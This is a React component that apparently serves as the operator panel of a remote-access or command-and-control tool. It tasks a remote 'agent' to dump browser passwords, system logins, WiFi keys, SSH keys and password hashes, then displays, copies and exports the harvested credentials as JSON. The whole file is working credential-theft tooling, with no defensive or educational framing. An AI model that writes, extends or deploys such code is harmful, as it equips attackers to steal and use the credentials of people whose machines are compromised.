// client/src/components/tools/CredentialViewer.jsx
import React, { useState, useEffect } from 'react';
import { 
  Key, Lock, User, Globe, Database, 
  Eye, EyeOff, Copy, Download, Search,
  Chrome, Shield, Wifi, Terminal
} from 'lucide-react';
import { useApi } from '../../hooks/useApi';

export default function CredentialViewer({ agentId }) {
  const api = useApi();
  const [activeTab, setActiveTab] = useState('browser');
  const [credentials, setCredentials] = useState([]);
  const [loading, setLoading] = useState(false);
  const [showPasswords, setShowPasswords] = useState({});
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedCreds, setSelectedCreds] = useState(new Set());
  
  useEffect(() => {
    fetchCredentials();
  }, [agentId, activeTab]);
  
  const fetchCredentials = async () => {
    setLoading(true);
    try {
      const data = await api.post(`/api/agents/${agentId}/tasks`, {
        module: 'credentials',
        command: `dump_${activeTab}`,
        parameters: {}
      });
      
      const result = await waitForTaskCompletion(data.task_id);
      setCredentials(JSON.parse(result.output));
    } catch (error) {
      console.error('Failed to fetch credentials:', error);
    } finally {
      setLoading(false);
    }
  };
  
  const waitForTaskCompletion = async (taskId, timeout = 30000) => {
    const startTime = Date.now();
    while (Date.now() - startTime < timeout) {
      const task = await api.get(`/api/tasks/${taskId}`);
      if (task.status === 'completed') {
        return task;
      } else if (task.status === 'failed') {
        throw new Error(task.error || 'Task failed');
      }
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    throw new Error('Task timeout');
  };
  
  const togglePasswordVisibility = (id) => {
    setShowPasswords(prev => ({ ...prev, [id]: !prev[id] }));
  };
  
  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    // You could add a toast notification here
  };
  
  const exportCredentials = () => {
    const selectedData = credentials.filter((_, index) => 
      selectedCreds.size === 0 || selectedCreds.has(index)
    );
    
    const data = JSON.stringify(selectedData, null, 2);
    const blob = new Blob([data], { type: 'application/json' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `credentials_${activeTab}_${Date.now()}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
  };
  
  const toggleSelection = (index) => {
    const newSelected = new Set(selectedCreds);
    if (newSelected.has(index)) {
      newSelected.delete(index);
    } else {
      newSelected.add(index);
    }
    setSelectedCreds(newSelected);
  };
  
  const selectAll = () => {
    if (selectedCreds.size === filteredCredentials.length) {
      setSelectedCreds(new Set());
    } else {
      setSelectedCreds(new Set(filteredCredentials.map((_, i) => i)));
    }
  };
  
  const getCredentialIcon = (type) => {
    switch (type) {
      case 'browser':
        return Chrome;
      case 'system':
        return Shield;
      case 'wifi':
        return Wifi;
      case 'ssh':
        return Terminal;
      default:
        return Key;
    }
  };
  
  const tabs = [
    { id: 'browser', label: 'Browser', icon: Chrome },
    { id: 'system', label: 'System', icon: Shield },
    { id: 'wifi', label: 'WiFi', icon: Wifi },
    { id: 'ssh', label: 'SSH Keys', icon: Terminal },
    { id: 'hash', label: 'Hashes', icon: Lock }
  ];
  
  const filteredCredentials = credentials.filter(cred => {
    const searchLower = searchTerm.toLowerCase();
    return (
      (cred.url?.toLowerCase().includes(searchLower)) ||
      (cred.username?.toLowerCase().includes(searchLower)) ||
      (cred.service?.toLowerCase().includes(searchLower)) ||
      (cred.name?.toLowerCase().includes(searchLower))
    );
  });
  
  return (
    <div className="space-y-4">
      {/* Tabs */}
      <div className="flex space-x-1 border-b border-gray-700">
        {tabs.map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            className={`flex items-center px-4 py-2 text-sm font-medium rounded-t-lg transition-colors ${
              activeTab === tab.id
                ? 'bg-gray-800 text-white border-b-2 border-blue-500'
                : 'text-gray-400 hover:text-white hover:bg-gray-800'
            }`}
          >
            <tab.icon className="h-4 w-4 mr-2" />
            {tab.label}
          </button>
        ))}
      </div>
      
      {/* Controls */}
      <div className="flex items-center justify-between">
        <div className="flex items-center space-x-4">
          <div className="relative">
            <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
            <input
              type="text"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              placeholder="Search credentials..."
              className="pl-10 pr-4 py-2 bg-gray-900 text-white rounded border border-gray-700 focus:border-blue-500 focus:outline-none"
            />
          </div>
          
          <button
            onClick={() => setShowPasswords({})}
            className="flex items-center px-3 py-2 bg-gray-800 text-gray-300 rounded hover:bg-gray-700"
          >
            <EyeOff className="h-4 w-4 mr-2" />
            Hide All
          </button>
        </div>
        
        <div className="flex items-center space-x-2">
          <button
            onClick={selectAll}
            className="px-3 py-2 bg-gray-800 text-gray-300 rounded hover:bg-gray-700"
          >
            {selectedCreds.size === filteredCredentials.length ? 'Deselect All' : 'Select All'}
          </button>
          
          <button
            onClick={exportCredentials}
            disabled={filteredCredentials.length === 0}
            className="flex items-center px-3 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 disabled:opacity-50"
          >
            <Download className="h-4 w-4 mr-2" />
            Export
          </button>
        </div>
      </div>
      
      {/* Credentials List */}
      <div className="bg-gray-900 rounded-lg overflow-hidden">
        {loading ? (
          <div className="flex items-center justify-center h-64">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500"></div>
          </div>
        ) : filteredCredentials.length === 0 ? (
          <div className="text-center py-16">
            <Key className="h-16 w-16 text-gray-600 mx-auto mb-4" />
            <p className="text-gray-400">No credentials found</p>
          </div>
        ) : (
          <div className="divide-y divide-gray-800">
            {/* Browser Credentials */}
            {activeTab === 'browser' && filteredCredentials.map((cred, index) => (
              <div key={index} className="p-4 hover:bg-gray-800">
                <div className="flex items-start space-x-4">
                  <input
                    type="checkbox"
                    checked={selectedCreds.has(index)}
                    onChange={() => toggleSelection(index)}
                    className="mt-1"
                  />
                  
                  <div className="flex-1">
                    <div className="flex items-start justify-between">
                      <div>
                        <div className="flex items-center space-x-2 mb-1">
                          <Globe className="h-4 w-4 text-gray-400" />
                          <a 
                            href={cred.url} 
                            target="_blank" 
                            rel="noopener noreferrer"
                            className="text-blue-400 hover:text-blue-300"
                          >
                            {cred.url}
                          </a>
                        </div>
                        
                        <div className="grid grid-cols-2 gap-4 text-sm">
                          <div className="flex items-center space-x-2">
                            <User className="h-4 w-4 text-gray-400" />
                            <span className="text-white">{cred.username}</span>
                            <button
                              onClick={() => copyToClipboard(cred.username)}
                              className="text-gray-400 hover:text-white"
                            >
                              <Copy className="h-3 w-3" />
                            </button>
                          </div>
                          
                          <div className="flex items-center space-x-2">
                            <Lock className="h-4 w-4 text-gray-400" />
                            <span className="text-white font-mono">
                              {showPasswords[index] ? cred.password : '••••••••'}
                            </span>
                            <button
                              onClick={() => togglePasswordVisibility(index)}
                              className="text-gray-400 hover:text-white"
                            >
                              {showPasswords[index] ? 
                                <EyeOff className="h-3 w-3" /> : 
                                <Eye className="h-3 w-3" />
                              }
                            </button>
                            <button
                              onClick={() => copyToClipboard(cred.password)}
                              className="text-gray-400 hover:text-white"
                            >
                              <Copy className="h-3 w-3" />
                            </button>
                          </div>
                        </div>
                        
                        <p className="text-xs text-gray-500 mt-2">
                          Last used: {new Date(cred.lastUsed).toLocaleDateString()}
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ))}
            
            {/* System Credentials */}
            {activeTab === 'system' && filteredCredentials.map((cred, index) => (
              <div key={index} className="p-4 hover:bg-gray-800">
                <div className="flex items-start space-x-4">
                  <input
                    type="checkbox"
                    checked={selectedCreds.has(index)}
                    onChange={() => toggleSelection(index)}
                    className="mt-1"
                  />
                  
                  <div className="flex-1">
                    <div className="flex items-center space-x-2 mb-2">
                      <Shield className="h-4 w-4 text-gray-400" />
                      <span className="text-white font-medium">{cred.service}</span>
                    </div>
                    
                    <div className="grid grid-cols-2 gap-4 text-sm">
                      <div className="flex items-center space-x-2">
                        <span className="text-gray-400">Username:</span>
                        <span className="text-white">{cred.username}</span>
                        <button
                          onClick={() => copyToClipboard(cred.username)}
                          className="text-gray-400 hover:text-white"
                        >
                          <Copy className="h-3 w-3" />
                        </button>
                      </div>
                      
                      <div className="flex items-center space-x-2">
                        <span className="text-gray-400">Domain:</span>
                        <span className="text-white">{cred.domain || 'Local'}</span>
                      </div>
                    </div>
                    
                    {cred.hash && (
                      <div className="mt-2 text-sm">
                        <span className="text-gray-400">Hash:</span>
                        <code className="ml-2 text-yellow-400 font-mono text-xs">
                          {cred.hash}
                        </code>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            ))}
            
            {/* WiFi Credentials */}
            {activeTab === 'wifi' && filteredCredentials.map((cred, index) => (
              <div key={index} className="p-4 hover:bg-gray-800">
                <div className="flex items-start space-x-4">
                  <input
                    type="checkbox"
                    checked={selectedCreds.has(index)}
                    onChange={() => toggleSelection(index)}
                    className="mt-1"
                  />
                  
                  <div className="flex-1">
                    <div className="flex items-center justify-between">
                      <div>
                        <div className="flex items-center space-x-2 mb-1">
                          <Wifi className="h-4 w-4 text-gray-400" />
                          <span className="text-white font-medium">{cred.ssid}</span>
                        </div>
                        
                        <div className="flex items-center space-x-4 text-sm">
                          <span className="text-gray-400">
                            Security: <span className="text-white">{cred.security}</span>
                          </span>
                          
                          <div className="flex items-center space-x-2">
                            <span className="text-gray-400">Password:</span>
                            <span className="text-white font-mono">
                              {showPasswords[index] ? cred.password : '••••••••'}
                            </span>
                            <button
                              onClick={() => togglePasswordVisibility(index)}
                              className="text-gray-400 hover:text-white"
                            >
                              {showPasswords[index] ? 
                                <EyeOff className="h-3 w-3" /> : 
                                <Eye className="h-3 w-3" />
                              }
                            </button>
                            <button
                              onClick={() => copyToClipboard(cred.password)}
                              className="text-gray-400 hover:text-white"
                            >
                              <Copy className="h-3 w-3" />
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ))}
            
            {/* SSH Keys */}
            {activeTab === 'ssh' && filteredCredentials.map((cred, index) => (
              <div key={index} className="p-4 hover:bg-gray-800">
                <div className="flex items-start space-x-4">
                  <input
                    type="checkbox"
                    checked={selectedCreds.has(index)}
                    onChange={() => toggleSelection(index)}
                    className="mt-1"
                  />
                  
                  <div className="flex-1">
                    <div className="flex items-center space-x-2 mb-2">
                      <Terminal className="h-4 w-4 text-gray-400" />
                      <span className="text-white font-medium">{cred.name}</span>
                    </div>
                    
                    <div className="space-y-2 text-sm">
                      <div>
                        <span className="text-gray-400">Type:</span>
                        <span className="ml-2 text-white">{cred.type}</span>
                      </div>
                      <div>
                        <span className="text-gray-400">Fingerprint:</span>
                        <code className="ml-2 text-blue-400 font-mono text-xs">
                          {cred.fingerprint}
                        </code>
                      </div>
                      <div>
                        <span className="text-gray-400">Path:</span>
                        <span className="ml-2 text-white font-mono text-xs">{cred.path}</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ))}
            
            {/* Password Hashes */}
            {activeTab === 'hash' && filteredCredentials.map((cred, index) => (
              <div key={index} className="p-4 hover:bg-gray-800">
                <div className="flex items-start space-x-4">
                  <input
                    type="checkbox"
                    checked={selectedCreds.has(index)}
                    onChange={() => toggleSelection(index)}
                    className="mt-1"
                  />
                  
                  <div className="flex-1">
                    <div className="flex items-center space-x-2 mb-2">
                      <Lock className="h-4 w-4 text-gray-400" />
                      <span className="text-white">{cred.username}</span>
                      {cred.domain && (
                        <span className="text-gray-400">@{cred.domain}</span>
                      )}
                    </div>
                    
                    <div className="space-y-1">
                      <div className="text-sm">
                        <span className="text-gray-400">Type:</span>
                        <span className="ml-2 text-yellow-400">{cred.hashType}</span>
                      </div>
                      <div className="text-sm">
                        <span className="text-gray-400">Hash:</span>
                        <code className="ml-2 text-white font-mono text-xs break-all">
                          {cred.hash}
                        </code>
                        <button
                          onClick={() => copyToClipboard(cred.hash)}
                          className="ml-2 text-gray-400 hover:text-white"
                        >
                          <Copy className="h-3 w-3" />
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
